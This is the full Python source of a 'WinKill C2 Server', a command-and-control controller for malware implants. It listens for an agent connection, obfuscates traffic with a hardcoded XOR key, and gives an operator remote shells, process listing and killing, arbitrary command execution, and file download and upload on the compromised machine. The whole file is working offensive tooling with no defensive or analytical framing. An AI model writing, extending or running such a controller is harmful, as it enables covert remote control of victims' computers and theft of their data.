#!/usr/bin/env python3
"""
WinKill C2 Server
=================
Multiplexed TCP C2 controller with chunked file transfer support.
"""

import os
import shlex
import socket
import struct
import sys
import threading
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

CHAN_CTRL = 0x00000000
CHAN_SHELL = 0x10000000

MSG_HEARTBEAT = 0x00
MSG_STATUS = 0x01
MSG_SHUTDOWN = 0x02
MSG_SHELL_SPAWN = 0x10
MSG_SHELL_DATA = 0x11
MSG_SHELL_KILL = 0x12
MSG_PROC_LIST = 0x20
MSG_PROC_KILL = 0x21
MSG_BIN_EXEC = 0x40
MSG_FILE_GET = 0x50
MSG_FILE_PUT = 0x51
MSG_FILE_DATA = 0x52

FILE_OP_BEGIN = 0x01
FILE_OP_CHUNK = 0x02
FILE_OP_END = 0x03
FILE_OP_ERROR = 0x7F
FILE_CHUNK_SIZE = 60000
MAX_FRAME_SIZE = 0x100000

KEY = bytes([
    0x4A, 0x7F, 0x23, 0x9C, 0x11, 0x8E, 0x55, 0x3D,
    0x6B, 0x12, 0x89, 0xFA, 0x34, 0xD7, 0x01, 0xCB,
])


def xor(data):
    return bytes(b ^ KEY[i % 16] for i, b in enumerate(data))


def recv_exact(sock, size):
    buf = bytearray()
    while len(buf) < size:
        chunk = sock.recv(size - len(buf))
        if not chunk:
            return None
        buf.extend(chunk)
    return bytes(buf)


class ShellSession:
    def __init__(self, sid, channel):
        self.id = sid
        self.channel = channel
        self.alive = True
        self.output_buffer = b""


class FileTransfer:
    def __init__(self, transfer_id, remote_name, local_path, total_size):
        self.id = transfer_id
        self.remote_name = remote_name
        self.local_path = local_path
        self.total_size = total_size
        self.received = 0
        self.handle = None


class C2Server:
    def __init__(self):
        self.sock = None
        self.sessions = {}
        self.next_sid = 2
        self.active_shell = None
        self.lock = threading.Lock()
        self.send_lock = threading.Lock()
        self.next_transfer_id = 1
        self.downloads = {}
        self.exec_active = False

    def log_prompt(self):
        sys.stdout.write("C2> ")
        sys.stdout.flush()

    def send_frame(self, channel, msg_type, payload=b""):
        total = len(payload) + 5
        frame = struct.pack("<IIB", total, channel, msg_type) + payload
        frame = frame[:4] + xor(frame[4:])
        with self.send_lock:
            self.sock.sendall(frame)

    def recv_frame(self):
        try:
            hdr = recv_exact(self.sock, 4)
            if hdr is None:
                return None
            total = struct.unpack("<I", hdr)[0]
            if total < 5 or total > MAX_FRAME_SIZE:
                return None
            buf = recv_exact(self.sock, total)
            if buf is None:
                return None
            buf = xor(buf)
            ch = struct.unpack("<I", buf[:4])[0]
            mt = buf[4]
            pl = buf[5:]
            return ch, mt, pl
        except OSError:
            return None

    def next_tid(self):
        tid = self.next_transfer_id
        self.next_transfer_id += 1
        return tid

    def print_status(self, text):
        print(f"\n[Agent] {text}")
        self.log_prompt()

    def handle_file_data(self, payload):
        if len(payload) < 5:
            return

        op = payload[0]
        transfer_id = struct.unpack("<I", payload[1:5])[0]

        if op == FILE_OP_BEGIN:
            if len(payload) < 15:
                return
            total_size = struct.unpack("<Q", payload[5:13])[0]
            name_len = struct.unpack("<H", payload[13:15])[0]
            if len(payload) < 15 + name_len:
                return
            remote_name = payload[15:15 + name_len].decode(errors="replace")
            os.makedirs("downloads", exist_ok=True)
            local_name = remote_name.replace("\\", "_").replace("/", "_")
            local_path = os.path.join("downloads", local_name)
            transfer = FileTransfer(transfer_id, remote_name, local_path, total_size)
            transfer.handle = open(local_path, "wb")
            self.downloads[transfer_id] = transfer
            print(f"\n[Download] start {remote_name} -> {local_path} ({total_size} bytes)")
            self.log_prompt()
            return

        if op == FILE_OP_CHUNK:
            transfer = self.downloads.get(transfer_id)
            if not transfer or transfer.handle is None:
                return
            chunk = payload[5:]
            transfer.handle.write(chunk)
            transfer.received += len(chunk)
            return

        if op == FILE_OP_END:
            transfer = self.downloads.pop(transfer_id, None)
            total_reported = 0
            if len(payload) >= 13:
                total_reported = struct.unpack("<Q", payload[5:13])[0]
            if transfer and transfer.handle:
                transfer.handle.close()
                print(
                    f"\n[Download] done {transfer.remote_name} "
                    f"({transfer.received}/{total_reported} bytes) -> {transfer.local_path}"
                )
                self.log_prompt()
            return

        if op == FILE_OP_ERROR:
            msg = payload[5:].decode(errors="replace").strip()
            transfer = self.downloads.pop(transfer_id, None)
            if transfer and transfer.handle:
                transfer.handle.close()
                try:
                    os.remove(transfer.local_path)
                except OSError:
                    pass
            print(f"\n[Download] error #{transfer_id}: {msg}")
            self.log_prompt()

    def reader_loop(self):
        while True:
            frame = self.recv_frame()
            if frame is None:
                break
            ch, mt, pl = frame

            if ch == CHAN_CTRL:
                if mt == MSG_STATUS:
                    self.print_status(pl.decode(errors="replace").strip())
                elif mt == MSG_PROC_LIST:
                    print(f"\n{pl.decode(errors='replace')}")
                    self.log_prompt()
                elif mt == MSG_PROC_KILL:
                    print(f"\n{pl.decode(errors='replace').strip()}")
                    self.log_prompt()
                elif mt == MSG_FILE_DATA:
                    self.handle_file_data(pl)
                elif mt == MSG_BIN_EXEC:
                    if pl:
                        if not self.exec_active:
                            self.exec_active = True
                            print("\n[Exec]")
                        try:
                            sys.stdout.write(pl.decode("gbk", errors="replace"))
                        except Exception:
                            sys.stdout.buffer.write(pl)
                        sys.stdout.flush()
                    else:
                        if self.exec_active:
                            self.exec_active = False
                            print("\n[Exec done]")
                            self.log_prompt()

            elif (ch & 0xF0000000) == CHAN_SHELL:
                sid = ch & 0x0FFFFFFF
                if mt == MSG_SHELL_DATA:
                    with self.lock:
                        if self.active_shell == sid:
                            try:
                                text = pl.decode("gbk", errors="replace")
                                sys.stdout.write(text)
                            except Exception:
                                sys.stdout.buffer.write(pl)
                            sys.stdout.flush()
                        elif sid in self.sessions:
                            self.sessions[sid].output_buffer += pl

        print("\n[-] Agent disconnected")

    def cmd_shell(self, args):
        if not args:
            print("Active shells:")
            for session in self.sessions.values():
                print(f"  Shell #{session.id} (ch={session.channel:08X})")
            print("Use 'shell new' to spawn, 'shell <id>' to interact")
            return

        if args[0] == "new":
            sid = self.next_sid
            self.next_sid += 1
            channel = CHAN_SHELL | sid
            self.send_frame(CHAN_CTRL, MSG_SHELL_SPAWN, struct.pack("<I", channel))
            self.sessions[sid] = ShellSession(sid, channel)
            print(f"[+] Shell #{sid} spawned (ch={channel:08X})")
            return

        if args[0] == "list":
            self.cmd_shell([])
            return

        try:
            sid = int(args[0])
        except ValueError:
            print(f"Unknown: {args[0]}")
            return

        if sid not in self.sessions:
            print(f"Shell #{sid} not found. Use 'shell new' first.")
            return

        with self.lock:
            self.active_shell = sid

        session = self.sessions[sid]
        if session.output_buffer:
            try:
                text = session.output_buffer.decode("gbk", errors="replace")
                sys.stdout.write(text)
            except Exception:
                sys.stdout.buffer.write(session.output_buffer)
            sys.stdout.flush()
            session.output_buffer = b""

        print(f"\n[*] Shell #{sid} (Ctrl+C to exit)")
        try:
            while True:
                try:
                    line = input()
                except EOFError:
                    break
                if not line and self.active_shell != sid:
                    break
                if line:
                    self.send_frame(
                        self.sessions[sid].channel,
                        MSG_SHELL_DATA,
                        (line + "\r\n").encode(),
                    )
        except (KeyboardInterrupt, BrokenPipeError):
            pass
        finally:
            with self.lock:
                self.active_shell = None
            print(f"\n[*] Left Shell #{sid}")

    def cmd_ps(self, _args):
        self.send_frame(CHAN_CTRL, MSG_PROC_LIST)
        time.sleep(0.5)

    def cmd_kill(self, args):
        if args:
            self.send_frame(CHAN_CTRL, MSG_PROC_KILL, args[0].encode())

    def cmd_exec(self, args):
        if not args:
            return
        cmd = " ".join(args)
        self.send_frame(CHAN_CTRL, MSG_BIN_EXEC, cmd.encode())
        print(f"[+] Exec sent: {cmd}")

    def cmd_download(self, args):
        if not args:
            print("Usage: download <remote_path>")
            return
        remote_path = " ".join(args)
        remote_bytes = remote_path.encode()
        transfer_id = self.next_tid()
        payload = struct.pack("<IH", transfer_id, len(remote_bytes)) + remote_bytes
        self.send_frame(CHAN_CTRL, MSG_FILE_GET, payload)
        print(f"[+] Download request #{transfer_id}: {remote_path}")

    def cmd_upload(self, args):
        if len(args) < 2:
            print("Usage: upload <local_path> <remote_path>")
            return

        src = args[0]
        remote_path = " ".join(args[1:])
        if not os.path.isfile(src):
            print(f"[-] Local file not found: {src}")
            return

        remote_bytes = remote_path.encode()
        if len(remote_bytes) > 0xFFFF:
            print("[-] Remote path too long")
            return

        transfer_id = self.next_tid()
        total_size = os.path.getsize(src)
        begin = (
            bytes([FILE_OP_BEGIN]) +
            struct.pack("<IQH", transfer_id, total_size, len(remote_bytes)) +
            remote_bytes
        )
        self.send_frame(CHAN_CTRL, MSG_FILE_PUT, begin)

        sent = 0
        with open(src, "rb") as handle:
            while True:
                chunk = handle.read(FILE_CHUNK_SIZE)
                if not chunk:
                    break
                payload = bytes([FILE_OP_CHUNK]) + struct.pack("<I", transfer_id) + chunk
                self.send_frame(CHAN_CTRL, MSG_FILE_PUT, payload)
                sent += len(chunk)

        end = bytes([FILE_OP_END]) + struct.pack("<IQ", transfer_id, sent)
        self.send_frame(CHAN_CTRL, MSG_FILE_PUT, end)
        print(f"[+] Upload request #{transfer_id}: {src} -> {remote_path} ({sent} bytes)")

    def run(self):
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((HOST, PORT))
        listener.listen(1)
        print(f"[*] Listening on {HOST}:{PORT} ...")

        self.sock, addr = listener.accept()
        listener.close()
        print(f"[+] Agent: {addr[0]}:{addr[1]}")
        print("[*] Shell #1 auto-spawned. Use 'shell 1' to interact.\n")

        self.sessions[1] = ShellSession(1, CHAN_SHELL | 1)

        threading.Thread(target=self.reader_loop, daemon=True).start()

        def hb():
            while True:
                time.sleep(30)
                try:
                    self.send_frame(CHAN_CTRL, MSG_HEARTBEAT)
                except OSError:
                    break

        threading.Thread(target=hb, daemon=True).start()

        while True:
            try:
                raw = input("C2> ").strip()
            except (EOFError, KeyboardInterrupt):
                break

            if not raw:
                continue

            try:
                parts = shlex.split(raw, posix=True)
            except ValueError as exc:
                print(f"[-] Parse error: {exc}")
                continue
            cmd = parts[0].lower()
            args = parts[1:]

            if cmd == "help":
                print(
                    "shell [id|new|list]  ps  kill <PID>  exec <cmd>  "
                    "download <remote>  upload <local> <remote>  shutdown  exit"
                )
            elif cmd == "shell":
                self.cmd_shell(args)
            elif cmd == "ps":
                self.cmd_ps(args)
            elif cmd == "kill":
                self.cmd_kill(args)
            elif cmd == "exec":
                self.cmd_exec(args)
            elif cmd == "download":
                self.cmd_download(args)
            elif cmd == "upload":
                self.cmd_upload(args)
            elif cmd in ("shutdown", "exit"):
                self.send_frame(CHAN_CTRL, MSG_SHUTDOWN)
                break
            else:
                print(f"Unknown: {cmd}. Try 'help'")

        print("\n[*] Done")
        try:
            self.sock.close()
        except OSError:
            pass


if __name__ == "__main__":
    C2Server().run()
